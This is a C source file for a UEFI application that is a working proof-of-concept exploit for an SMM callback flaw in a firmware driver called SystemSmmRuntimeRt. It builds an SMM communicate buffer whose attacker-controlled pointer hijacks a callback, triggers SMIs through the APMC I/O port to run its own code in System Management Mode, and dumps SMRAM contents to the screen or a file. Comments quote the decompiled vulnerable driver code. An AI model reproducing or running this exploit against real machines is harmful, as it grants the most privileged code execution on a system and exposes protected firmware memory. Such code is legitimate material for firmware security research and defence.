#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <Uefi.h>
#include <FrameworkSmm.h>

#include <Library/BaseLib.h>
#include <Library/DevicePathLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiLib.h>
#include <Library/UefiApplicationEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/ShellLib.h>
#include <Library/ShellCEntryLib.h>

#include <Protocol/SmmBase.h>
#include <Protocol/SmmAccess.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/SimpleFileSystem.h>

#include <Guid/SmmCommunicate.h>

#include "hexdump.h"

// image name for SystemSmmRuntimeRt UEFI driver
#define IMAGE_NAME L"FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E)"

// SMM communication data size
#define BUFF_SIZE 0x1000

#define MAX_SMRAM_REGIONS   2
#define MAX_HANDLES         0x10
#define MAX_PATH            0x200

/*
    Callback function of SystemSmmRuntimeRt that runs in SMM, a2 argument has 
    attacker controlled value:

        __int64 __fastcall sub_A54(__int64 a1, __int64 a2)
        {
          __int64 v2; // rax@1
          __int64 v3; // rbx@1
         
          v2 = *(_QWORD *)(a2 + 0x20);
          v3 = a2;
          if ( v2 )
          {
            (v2 + 8)(*(_QWORD *)v2, &dword_AD002290, a2 + 0x18);
            *(_QWORD *)(v3 + 0x20) = 0i64;
          }
          return 0i64;
        }
*/
typedef VOID (* EXPLOIT_HANDLER)(VOID *Context, VOID *Unknown, VOID *Data);

typedef struct 
{
    VOID *Context;
    EXPLOIT_HANDLER Handler;

} STRUCT_1;

UINTN g_SmmHandlerExecuted = 0;
EFI_GUID g_SmmCommunicateHeaderGuid[] = SMM_COMMUNICATE_HEADER_GUID;

UINTN g_DumpSize = 0;
VOID *g_DumpAddr = NULL;
VOID *g_DumpBuff = NULL;
//--------------------------------------------------------------------------------------
VOID SmmHandler(VOID *Context, VOID *Unknown, VOID *Data)
{
    // tell to the caller that SMM code was executed
    g_SmmHandlerExecuted += 1;

    if (g_DumpBuff && g_DumpSize > 0)
    {
        // perform memory dump operation
        memcpy(g_DumpBuff, g_DumpAddr, g_DumpSize);
    }
}
//--------------------------------------------------------------------------------------
EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
{
    EFI_HANDLE *Buffer = NULL;
    UINTN BufferSize = 0, HandlesFound = 0, i = 0;    

    // determinate handles buffer size
    EFI_STATUS Status = gBS->LocateHandle(
        ByProtocol,
        &gEfiLoadedImageProtocolGuid,
        NULL,
        &BufferSize,
        NULL
    );
    if (Status != EFI_BUFFER_TOO_SMALL)
    {
        printf("LocateHandle() ERROR 0x%.8x\n", Status);
        return Status;
    }

    // allocate required amount of memory
    if ((Status = gBS->AllocatePool(0, BufferSize, (VOID **)&Buffer)) != EFI_SUCCESS)
    {
        printf("AllocatePool() ERROR 0x%.8x\n", Status);
        return Status;
    }

    // get image handles list
    Status = gBS->LocateHandle(
        ByProtocol,
        &gEfiLoadedImageProtocolGuid,
        NULL,
        &BufferSize,
        Buffer
    );
    if (Status == EFI_SUCCESS)
    {
        for (i = 0; i < BufferSize / sizeof(EFI_HANDLE); i += 1)
        {
            EFI_LOADED_IMAGE *LoadedImage = NULL;

            // get loaded image protocol instance for given image handle
            if (gBS->HandleProtocol(
                Buffer[i],
                &gEfiLoadedImageProtocolGuid, 
                (VOID *)&LoadedImage) == EFI_SUCCESS)
            {
                // get and check image path
                CHAR16 *Path = ConvertDevicePathToText(LoadedImage->FilePath, TRUE, TRUE);
                if (Path)
                {                            
                    if (!wcscmp(Path, TargetPath))
                    {
                        if (HandlesFound + 1 < *HandlesListLength)
                        {
                            // image handle was found
                            HandlesList[HandlesFound] = Buffer[i];
                            HandlesFound += 1;                        
                        }
                        else
                        {
                            // handles list is full
                            Status = EFI_BUFFER_TOO_SMALL;
                        }
                    }

                    gBS->FreePool(Path);                                        

                    if (Status != EFI_SUCCESS)
                    {
                        break;
                    }
                }
            }
        }
    }
    else
    {
        printf("LocateHandle() ERROR 0x%.8x\n", Status);
    }

    gBS->FreePool(Buffer); 

    if (Status == EFI_SUCCESS)
    {
        *HandlesListLength = HandlesFound;
    }

    return Status;
}
//--------------------------------------------------------------------------------------
VOID FireSynchronousSmi(UINT8 Handler, UINT8 Data)
{
    // fire SMI using APMC I/O port
    __outbyte(0xb3, Data);
    __outbyte(0xb2, Handler);
}
//--------------------------------------------------------------------------------------
/*    
    EFI_SMM_BASE_PROTOCOL->Communicate() saves SMM callback arguments at EFI_SMM_BASE_PROTOCOL + 0x40:

        aa9a93a0: 84 2a 00 ad 00 00 00 00  0e 00 00 00 00 00 00 80  | .*..............
        aa9a93b0: 60 93 9a aa 00 00 00 00  98 8c ac a4 00 00 00 00  | `...............
        aa9a93c0: 18 a0 88 ab 00 00 00 00  60 9c 19 a1 00 00 00 00  | ........`.......
*/
typedef struct 
{
    /* struct addr is EFI_SMM_BASE_PROTOCOL + 0x58 */

    EFI_HANDLE CallbackHandle;
    VOID *Data;
    UINTN *DataSize;

} COMMUNICATE_STRUCT;

/*
    SmmBaseRuntime code that initializes SW SMI number used in EFI_SMM_BASE_PROTOCOL->Communicate():

        int sub_1140()
        {
          int result; // eax@1
          __int64 v1; // [sp+30h] [bp+8h]@1

          v1 = 0i64;
          result = gBS->LocateProtocol(qword_460, 0i64, &v1);
          byte_39D8 = *(_BYTE *)(*(_QWORD *)(v1 + 8) + 9i64); // SW SMI number value
          return result;
        }
*/
#define COMMUNICATE_GUID  { 0x1279E288, 0x24CD, 0x47E9, 0x96, 0xBA, 0xD7, 0xA3, 0x8C, 0x17, 0xBD, 0x64 }

/* 
    This function is doing exact the same as EFI_SMM_BASE_PROTOCOL->Communicate(),
    currently it presents here just for reference.
*/
EFI_STATUS Communicate(EFI_SMM_BASE_PROTOCOL *SmmBase, EFI_HANDLE CallbackHandle, VOID *Data, UINTN *DataSize)
{
    UINT8 SmiNum = 0;    
    VOID *Proto = NULL;
    EFI_GUID Guid[] = COMMUNICATE_GUID;

    // locate OEM specific protocol
    EFI_STATUS Status = gBS->LocateProtocol(Guid, NULL, &Proto);
    if (Status == EFI_SUCCESS)
    {
        // global structure that used in EFI_SMM_BASE_PROTOCOL->Communicate()
        COMMUNICATE_STRUCT *Comm = 
            (COMMUNICATE_STRUCT *)((UINT8 *)SmmBase + sizeof(EFI_SMM_BASE_PROTOCOL) + 0x18);        

        printf("   SMM callback arguments are located at 0x%llx, SW SMI = %d\n", Comm, SmiNum);

        // save asynchronous SMM callback arguments
        Comm->CallbackHandle = CallbackHandle;
        Comm->Data = Data;
        Comm->DataSize = DataSize;

        // get SW SMI number
        SmiNum = *(UINT8 *)(*(UINT8 **)((UINT8 *)Proto + 0x08) + 0x09);

        FireSynchronousSmi(SmiNum, 1);
    }    

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
{
    EFI_STATUS Status = EFI_SUCCESS;    
    EFI_SMM_BASE_PROTOCOL *SmmBase = NULL;  

    STRUCT_1 Struct;   
    UINTN DataSize = BUFF_SIZE, i = 0;
    EFI_SMM_COMMUNICATE_HEADER *Data = NULL;

    EFI_HANDLE HandlesList[MAX_HANDLES];
    UINTN HandlesListLength = MAX_HANDLES;

    memset(HandlesList, 0, sizeof(HandlesList));
    g_SmmHandlerExecuted = 0;

    // locate SMM base protocol
    if ((Status = gBS->LocateProtocol(&gEfiSmmBaseProtocolGuid, NULL, &SmmBase)) != EFI_SUCCESS)
    {
        printf("ERROR: Unable to locate SMM base protocol: 0x%.8x\n", Status);
        goto _end;
    }

    printf("SMM base protocol is at 0x%llx\n", SmmBase);    

    // allocate memory for SMM communication data
    if ((Status = gBS->AllocatePool(0, DataSize, (VOID **)&Data)) != EFI_SUCCESS)
    {
        printf("AllocatePool() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    printf("Buffer for SMM communicate call is allocated at 0x%llx\n", Data);    
    printf("Obtaining %S image handles...\n", IMAGE_NAME);

    /*
        Obtain image handle, SystemSmmRuntimeRt UEFI driver registers sub_A54() as 
        SMM callback using EFI_HANDLE of it's own image that was passed to driver entry.
        We can determinate this handle value using LocateHandle() function of
        EFI_BOOT_SERVICES.
    */
    if (GetImageHandle(IMAGE_NAME, HandlesList, &HandlesListLength) == EFI_SUCCESS)
    {
        if (HandlesListLength > 0)
        {
            // enumerate all image handles that was found
            for (i = 0; i < HandlesListLength; i += 1)
            {
                EFI_HANDLE ImageHandle = HandlesList[i];

                printf(" * Handle = 0x%llx\n", ImageHandle);  
                
                DataSize = BUFF_SIZE;
                
                // set up data header
                memset(Data, 0, DataSize);
                memcpy(&Data->HeaderGuid, g_SmmCommunicateHeaderGuid, sizeof(EFI_GUID));                    
                Data->MessageLength = DataSize - sizeof(EFI_SMM_COMMUNICATE_HEADER);                

                // set up data body
                Struct.Context = NULL;
                Struct.Handler = Handler;
                *(VOID **)((UINT8 *)Data + 0x20) = (VOID *)&Struct;  

                // queue SMM communication call                
                Status = SmmBase->Communicate(SmmBase, ImageHandle, Data, &DataSize);

                // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
                FireSynchronousSmi(0, 0);

                printf(
                    "   Communicate() returned status 0x%.8x, data size is 0x%x\n", 
                    Status, DataSize
                );                

                if (g_SmmHandlerExecuted > 0)
                {
                    break;
                }
            }     

            if (g_SmmHandlerExecuted > 0)
            {
                printf("SmmHandler() was executed, exploitation success!\n");            

                Status = EFI_SUCCESS;
            }
            else
            {
                printf("ERROR: Exploitation fails\n");
            }                       
        }       
        else
        {
            printf("ERROR: Image handles was not found\n");
        } 
    }  

_end:

    if (Data)
    {
        gBS->FreePool(Data);
    }

    return Status;
}
//--------------------------------------------------------------------------------------
EFI_STATUS WriteFile(EFI_HANDLE ImageHandle, char *FilePath, VOID *Data, UINTN *DataSize)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_HANDLE FileHandle = NULL;
    CHAR16 Path[MAX_PATH];

    // convert file name to UTF-16 encoding
    AsciiStrToUnicodeStr(FilePath, Path);

    // create a new file
    if ((Status = ShellOpenFileByName(
        Path, &FileHandle,
        EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0)) == EFI_SUCCESS)
    {
        // write file contents
        if ((Status = ShellWriteFile(FileHandle, DataSize, Data)) == EFI_SUCCESS)
        {
            printf("%d bytes written into the %S\n", *DataSize, Path);
        }
        else
        {
            printf("ShellWriteFile() ERROR 0x%x\n", Status);
        }
    }
    else
    {
        printf("ShellOpenFileByName() ERROR 0x%x\n", Status);
    }

    return Status;
}
//--------------------------------------------------------------------------------------
int main(int Argc, char **Argv)
{
    int Ret = -1;
    char *lpszOutPath = NULL;
    EFI_STATUS Status = EFI_SUCCESS;    
    EFI_SMM_ACCESS_PROTOCOL *SmmAccess = NULL;  

    EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
    UINTN SmramMapSize = sizeof(SmramMap), i = 0;

    if (Argc >= 2)
    {
        if ((g_DumpAddr = (VOID *)strtoull(Argv[1], NULL, 16)) == 0 && errno == EINVAL)
        {
            printf("strtoull() ERROR %d\n", errno);
            return errno;
        }

        if (Argc >= 3)
        {
            if ((g_DumpSize = strtoull(Argv[2], NULL, 16)) == 0 && errno == EINVAL)
            {
                printf("strtoull() ERROR %d\n", errno);
                return errno;
            }

            if (Argc >= 4)
            {
                lpszOutPath = Argv[3];                
            }
        }
        else
        {
            g_DumpSize = 0x100;
        }

        printf(
            "Dumping 0x%llx bytes of memory from 0x%llx in SMM...\n", 
            g_DumpSize, g_DumpAddr
        );

        // allocate memory for SMRAM dump
        if ((Status = gBS->AllocatePool(0, g_DumpSize, &g_DumpBuff)) != EFI_SUCCESS)
        {
            printf("AllocatePool() ERROR 0x%.8x\n", Status);
            return -1;
        }

        memset(g_DumpBuff, 0, g_DumpSize);
    }

    // locate SMM access protocol
    if ((Status = gBS->LocateProtocol(&gEfiSmmAccessProtocolGuid, NULL, &SmmAccess)) != EFI_SUCCESS)
    {
        printf("ERROR: Unable to locate SMM access protocol: 0x%.8x\n", Status);
        goto _end;
    }

    printf("SMM access protocol is at 0x%llx\n", SmmAccess);

    // get SMRAM regions information
    if ((Status = SmmAccess->GetCapabilities(SmmAccess, &SmramMapSize, SmramMap)) != EFI_SUCCESS)
    {
        printf("GetCapabilities() ERROR 0x%.8x\n", Status);
        goto _end;
    }

    printf("Available SMRAM regions:\n");

    for (i = 0; i < SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
    {
        printf(
            " * 0x%.8llx:0x%.8llx\n", 
            SmramMap[i].PhysicalStart,
            SmramMap[i].PhysicalStart + SmramMap[i].PhysicalSize - 1
        );
    }

    // run exploit
    if (SystemSmmRuntimeRt_Exploit(SmmHandler) == EFI_SUCCESS)
    {
        if (g_DumpBuff && g_DumpSize > 0)
        {
            if (lpszOutPath)
            {
                // save memory dump into the file
                WriteFile(gImageHandle, lpszOutPath, g_DumpBuff, &g_DumpSize); 
            }
            else
            {
                // print memory dump to stdout
                hexdump(g_DumpBuff, g_DumpSize, g_DumpAddr);
            }
        }
    }

_end:

    if (g_DumpBuff)
    {
        gBS->FreePool(g_DumpBuff);   
    }  

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF
